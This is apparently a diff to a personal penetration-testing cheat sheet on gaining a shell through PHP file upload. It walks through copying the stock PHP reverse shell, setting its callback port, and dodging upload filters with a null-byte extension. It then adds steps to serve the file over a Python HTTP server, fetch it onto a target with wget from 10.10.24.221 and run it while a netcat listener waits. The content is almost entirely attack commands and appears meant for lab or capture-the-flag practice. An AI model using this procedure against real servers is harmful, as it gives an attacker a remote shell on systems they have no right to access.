@@ -3,8 +3,9 @@ PHP Upload file
 cp /usr/share/webshells/php/php-reverse-shell.php .
 ip a
 vim php-reverse-shell.php
+mv php-reverse-shell.php rev.php
 ```
-change IP and Port:443
+change IP and Port:8888
 
 If upload file not allowed:
 ```bash
@@ -26,5 +27,26 @@ mv rev.php rev.php%00.jpg
 ```
 [[netcat]]
 ```bash
-nc -nlvp 4444
+nc -nlvp 8888
 ```
+
+**Upload file to victim machine**
+*Local machine*
+```bash
+python3 -m http.server 80
+```
+*Target machine*
+```bash
+wget 10.10.24.221/rev.php
+chmod +x rev.php
+```
+*Local machine*
+```
+nc -nlvp 8888
+```
+*Target machine*
+```bash
+php rev.php
+```
+*Local machine*
+[[Shell]]
